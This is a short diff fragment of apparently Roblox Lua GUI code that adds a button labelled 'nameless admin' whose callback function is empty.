+end) 
+
+createButton("nameless admin", UDim2.new(0, 1408, 0, 608), function()
+
+end) 
+
+
+
+
+
